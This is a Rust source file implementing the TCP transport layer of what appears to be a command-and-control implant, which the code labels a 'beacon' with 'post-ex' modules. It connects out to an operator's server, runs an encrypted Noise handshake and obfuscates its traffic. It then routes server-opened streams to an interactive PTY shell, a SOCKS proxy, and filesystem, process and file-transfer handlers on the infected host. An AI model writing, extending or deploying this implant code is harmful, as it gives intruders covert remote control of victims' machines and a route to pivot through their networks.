// TCP 传输层实现
//
// 提供基于原始 TCP 套接字的传输层实现，使用 Yamux 多路复用。

use crate::backoff::ExponentialBackoff;
use crate::config::{get_aes_key, get_aes_key_base};
use crate::crypto;
use crate::error::{ClientError, Result};
use crate::transport::traffic_crypto::{seal_for_wire, traffic_key, FragReassembler, OpenResult};
use crate::transport::Transport;
use async_trait::async_trait;
use std::io::Write;
use tokio::io::{AsyncReadExt as _, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::sleep;
use tokio_util::compat::{FuturesAsyncReadCompatExt, TokioAsyncReadCompatExt};
use yamux::{Config, Connection, Mode, WindowUpdateMode};

/// TCP 传输实现
pub struct TcpTransport {
    url: String,
    control_stream: Option<tokio_util::compat::Compat<yamux::Stream>>,
    aes_key: Vec<u8>,
    noise_psk: Vec<u8>,
    backoff: ExponentialBackoff,
    noise_session_key: Option<[u8; 32]>,
    reassembler: FragReassembler,
}

impl TcpTransport {
    pub fn new(url: String) -> Self {
        Self {
            url,
            control_stream: None,
            aes_key: get_aes_key(),
            noise_psk: get_aes_key_base(),
            backoff: ExponentialBackoff::default(),
            noise_session_key: None,
            reassembler: FragReassembler::new(),
        }
    }

    fn parse_url(&self) -> Result<(String, u16)> {
        let full_url = if !self.url.contains("://") {
            format!("tcp://{}", self.url)
        } else {
            self.url.clone()
        };
        let rest = full_url.split("://").nth(1).ok_or_else(|| {
            ClientError::ConnectionError(format!("Invalid URL format: {}", self.url))
        })?;
        let addr = rest.split('/').next().unwrap_or(rest);
        let parts: Vec<&str> = addr.split(':').collect();
        if parts.len() != 2 {
            return Err(ClientError::ConnectionError(format!(
                "Invalid TCP address: {}",
                addr
            )));
        }
        let host = parts[0].to_string();
        let port = parts[1]
            .parse::<u16>()
            .map_err(|e| ClientError::ConnectionError(e.to_string()))?;
        Ok((host, port))
    }
}

#[async_trait]
impl Transport for TcpTransport {
    async fn connect(&mut self) -> Result<()> {
        let (host, port) = self.parse_url()?;
        let addr = format!("{}:{}", host, port);

        // Bounded retries so outer fallback / backoff can run (was infinite loop).
        const MAX_ATTEMPTS: u32 = 5;
        let mut attempts = 0u32;

        loop {
            attempts += 1;
            #[cfg(debug_assertions)]
            crate::db_print!(
                "Connecting to {}... (attempt {}/{})",
                addr, attempts, MAX_ATTEMPTS
            );
            match TcpStream::connect(&addr).await {
                Ok(stream) => {
                    // 🛡️ [Hardening] Configure low-level socket options
                    if let Ok(std_stream) = stream.into_std() {
                        let socket = socket2::Socket::from(std_stream);
                        let _ = socket.set_keepalive(true);
                        let _ = socket.set_tcp_nodelay(true);
                        let _ = socket.set_linger(Some(std::time::Duration::from_secs(2)));

                        // Re-wrap into tokio stream
                        let stream = match TcpStream::from_std(socket.into()) {
                            Ok(s) => s,
                            Err(_) => {
                                #[cfg(debug_assertions)]
                                crate::db_print!("[*] Failed to re-wrap TCP stream");
                                if attempts >= MAX_ATTEMPTS {
                                    return Err(ClientError::ConnectionError(
                                        "tcp re-wrap failed after max attempts".into(),
                                    ));
                                }
                                let delay = self.backoff.next_delay();
                                sleep(delay).await;
                                continue;
                            }
                        };
                        #[cfg(debug_assertions)]
                        crate::db_print!("[*] secure socket ready.");

                        let mut yamux_config = Config::default();
                        // 缓冲区大小：16MB（足够大文件传输，但不会 OOM）
                        yamux_config.set_max_buffer_size(16 * 1024 * 1024);
                        yamux_config.set_receive_window(16 * 1024 * 1024);
                        yamux_config.set_window_update_mode(WindowUpdateMode::OnRead);

                        let compat_stream = stream.compat();
                        let mut connection =
                            Connection::new(compat_stream, yamux_config, Mode::Client);
                        let mut control = connection.control();

                        // 🛠 全功能多路复用调度器 (带并发限制)
                        tokio::spawn(async move {
                            #[cfg(debug_assertions)]
                            crate::db_print!("[*] Connection driver started.");
                            // 限制并发流数量，防止资源耗尽
                            let stream_semaphore =
                                std::sync::Arc::new(tokio::sync::Semaphore::new(16));
                            loop {
                                match connection.next_stream().await {
                                Ok(Some(stream)) => {
                                    let stream_id = stream.id();
                                    #[cfg(debug_assertions)]
                                    crate::db_print!(
                                        "[*] New stream incoming. ID: {}",
                                        stream_id
                                        );
                                        let permit = match stream_semaphore
                                            .clone()
                                            .try_acquire_owned()
                                        {
                                            Ok(p) => p,
                                            Err(_) => {
                                                #[cfg(debug_assertions)]
                                                crate::db_print!("[*] Stream {} rejected: max concurrency reached", stream_id);
                                                drop(stream); // Close the stream
                                                continue;
                                            }
                                        };
                                        tokio::spawn(async move {
                                            let _permit = permit; // Hold permit until task completes
                                            use futures_util::AsyncReadExt as _;
                                            let mut stream = stream;
                                            let mut type_buf = [0u8; 1];
                                            if let Err(e) = stream.read_exact(&mut type_buf).await {
                                                #[cfg(debug_assertions)]
                                                crate::db_print!("[*] Failed to read stream type for ID {}: {}", stream_id, e);
                                                return;
                                            }

                                            #[cfg(debug_assertions)]
                                            crate::db_print!(
                                                "[*] Stream {} Type: 0x{:02X}",
                                                stream_id, type_buf[0]
                                            );
                                            use crate::transport::stream_types::{
                                                YAMUX_STREAM_FILE, YAMUX_STREAM_FS,
                                                YAMUX_STREAM_PROCESS, YAMUX_STREAM_PTY,
                                                YAMUX_STREAM_SOCKS,
                                            };
                                            match type_buf[0] {
                                                YAMUX_STREAM_PTY => {
                                                    #[cfg(feature = "pty")]
                                                    {
                                                        #[cfg(debug_assertions)]
                                                        crate::db_print!("[*] Routing to PTY handler (Stream {})", stream_id);
                                                        let _ = std::io::stdout().flush();
                                                        crate::pty::handle_stream(stream).await;
                                                    }
                                                    #[cfg(not(feature = "pty"))]
                                                    {
                                                        use futures_util::AsyncWriteExt;
                                                        let mut s = stream;
                                                        let _ = s.write_all(
                                                            b"\r\n[!] Interactive terminal (PTY) is not compiled into this agent profile.\r\n",
                                                        ).await;
                                                        let _ = s.close().await;
                                                    }
                                                }
                                                YAMUX_STREAM_SOCKS => {
                                                    #[cfg(feature = "socks")]
                                                    {
                                                        crate::socks::handle_stream(stream).await;
                                                    }
                                                    #[cfg(not(feature = "socks"))]
                                                    {
                                                        let _ = stream;
                                                    }
                                                }
                                                YAMUX_STREAM_FS => {
                                                    #[cfg(feature = "post-ex")]
                                                    {
                                                        crate::fs::handle_stream(stream).await;
                                                    }
                                                    #[cfg(not(feature = "post-ex"))]
                                                    {
                                                        use futures_util::AsyncWriteExt;
                                                        let mut s = stream;
                                                        let _ = s.write_all(b"\r\n[!] file module not in Stage0 (beacon)\r\n").await;
                                                        let _ = s.close().await;
                                                    }
                                                }
                                                YAMUX_STREAM_PROCESS => {
                                                    #[cfg(feature = "post-ex")]
                                                    {
                                                        crate::process::handle_stream(stream).await;
                                                    }
                                                    #[cfg(not(feature = "post-ex"))]
                                                    {
                                                        use futures_util::AsyncWriteExt;
                                                        let mut s = stream;
                                                        let _ = s.write_all(b"\r\n[!] process module not in Stage0 (beacon)\r\n").await;
                                                        let _ = s.close().await;
                                                    }
                                                }
                                                YAMUX_STREAM_FILE => {
                                                    // Binary put/get — same feature gate as FS (0x03)
                                                    #[cfg(feature = "post-ex")]
                                                    {
                                                        #[cfg(debug_assertions)]
                                                        crate::db_print!(
                                                            "[*] Routing to FILE handler (Stream {})",
                                                            stream_id
                                                        );
                                                        crate::file_stream::handle_stream(stream)
                                                            .await;
                                                    }
                                                    #[cfg(not(feature = "post-ex"))]
                                                    {
                                                        use futures_util::AsyncWriteExt;
                                                        let mut s = stream;
                                                        let _ = s
                                                            .write_all(
                                                                b"\r\n[!] FILE stream not in Stage0 (beacon)\r\n",
                                                            )
                                                            .await;
                                                        let _ = s.close().await;
                                                    }
                                                }
                                                _ => {
                                                    #[cfg(debug_assertions)]
                                                    crate::db_print!(
                                                        "[*] Unknown type: 0x{:02X}",
                                                        type_buf[0]
                                                    );
                                                }
                                            }
                                        });
                                    }
                                    Ok(None) => {
                                        #[cfg(debug_assertions)]
                                        crate::db_print!(
                                            "[*] Connection driver reached EOF."
                                        );
                                        break;
                                    }
                                    Err(e) => {
                                        #[cfg(debug_assertions)]
                                        crate::db_print!(
                                            "[*] Connection driver error: {}",
                                            e
                                        );
                                        break;
                                    }
                                }
                            }
                        });

                        let control_stream = match tokio::time::timeout(
                            std::time::Duration::from_secs(10),
                            control.open_stream(),
                        )
                        .await
                        {
                            Ok(Ok(s)) => s,
                            _ => {
                                return Err(ClientError::ConnectionError(
                                    "Yamux control failed".into(),
                                ))
                            }
                        };

                        #[cfg(debug_assertions)]
                        crate::db_print!("[*] Control established.");
                        self.control_stream = Some(control_stream.compat());
                        self.noise_session_key = None;
                        self.reassembler.clear();

                        // X25519 with BASE key as PSK (matches server resolveAESKey — no salt).
                        // A missing PSK is a hard failure: production never continues
                        // without an authenticated session key.
                        if self.noise_psk.is_empty() {
                            return Err(ClientError::ConnectionError(
                                "Noise PSK missing — refusing to establish unauthenticated session".into(),
                            ));
                        }
                        {
                            let (ephemeral_key, handshake_msg) =
                                crypto::noise_initiate(&self.noise_psk).map_err(|e| {
                                    ClientError::ConnectionError(format!("Noise init: {e}"))
                                })?;

                            let stream = self.control_stream.as_mut().unwrap();
                            let msg_len = handshake_msg.len() as u32;
                            stream
                                .write_u32(msg_len)
                                .await
                                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;
                            stream
                                .write_all(&handshake_msg)
                                .await
                                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;
                            stream
                                .flush()
                                .await
                                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;

                            let resp_len = stream
                                .read_u32()
                                .await
                                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;
                            if resp_len as usize != crypto::NOISE_MSG_LEN {
                                return Err(ClientError::ConnectionError(format!(
                                    "Invalid Noise resp len: {} (want {})",
                                    resp_len,
                                    crypto::NOISE_MSG_LEN
                                )));
                            }
                            let mut server_response = vec![0u8; crypto::NOISE_MSG_LEN];
                            stream
                                .read_exact(&mut server_response)
                                .await
                                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;

                            let session_key = crypto::noise_complete(
                                &ephemeral_key,
                                &server_response,
                                &self.noise_psk,
                            )
                            .map_err(|e| {
                                ClientError::ConnectionError(format!("Noise complete: {e}"))
                            })?;
                            self.noise_session_key = Some(session_key);
                            #[cfg(debug_assertions)]
                            crate::db_print!(
                                "[*] X25519 Noise OK — traffic uses session key"
                            );
                        }

                        self.backoff.reset();
                        return Ok(());
                    } else {
                        #[cfg(debug_assertions)]
                        crate::db_print!("[*] Socket hardening failed, retrying...");
                        if attempts >= MAX_ATTEMPTS {
                            return Err(ClientError::ConnectionError(
                                "connect setup failed".into(),
                            ));
                        }
                        let delay = self.backoff.next_delay();
                        sleep(delay).await;
                    }
                }
                Err(e) => {
                    if attempts >= MAX_ATTEMPTS {
                        return Err(ClientError::ConnectionError(format!(
                            "connect failed ({}/{}): {}",
                            MAX_ATTEMPTS, MAX_ATTEMPTS, e
                        )));
                    }
                    let delay = self.backoff.next_delay();
                    #[cfg(debug_assertions)]
                    crate::db_print!(
                        "Retry in {:?} ({}/{}): {}",
                        delay, attempts, MAX_ATTEMPTS, e
                    );
                    sleep(delay).await;
                }
            }
        }
    }

    async fn send(&mut self, data: &[u8]) -> Result<()> {
        let key = traffic_key(self.noise_session_key.as_ref(), &self.aes_key)?.to_vec();
        let frames = seal_for_wire(data, &key, 0)?;
        let stream = self
            .control_stream
            .as_mut()
            .ok_or_else(|| ClientError::ConnectionError("No stream".into()))?;
        for frame in frames {
            stream
                .write_u32(frame.len() as u32)
                .await
                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;
            stream
                .write_all(&frame)
                .await
                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;
        }
        stream
            .flush()
            .await
            .map_err(|e| ClientError::ConnectionError(e.to_string()))?;
        Ok(())
    }

    async fn receive(&mut self) -> Result<Vec<u8>> {
        let key = traffic_key(self.noise_session_key.as_ref(), &self.aes_key)?.to_vec();
        loop {
            let stream = self
                .control_stream
                .as_mut()
                .ok_or_else(|| ClientError::ConnectionError("No stream".into()))?;

            let len =
                match tokio::time::timeout(std::time::Duration::from_secs(120), stream.read_u32())
                    .await
                {
                    Ok(Ok(l)) => l as usize,
                    Ok(Err(e)) => return Err(ClientError::ConnectionError(e.to_string())),
                    Err(_) => {
                        return Err(ClientError::ConnectionError(
                            "Read timeout (half-open)".into(),
                        ))
                    }
                };

            if len > 100 * 1024 * 1024 {
                return Err(ClientError::ConnectionError("Too big".into()));
            }
            let mut buffer = vec![0u8; len];
            stream
                .read_exact(&mut buffer)
                .await
                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;
            let deobf = crypto::deobfuscate_packet(buffer);
            match self.reassembler.push(deobf, &key)? {
                OpenResult::Complete(pt) => return Ok(pt),
                OpenResult::NeedMore => continue,
            }
        }
    }

    fn is_connected(&self) -> bool {
        self.control_stream.is_some()
    }
    fn initialize(&mut self, _id: &str) {}
}
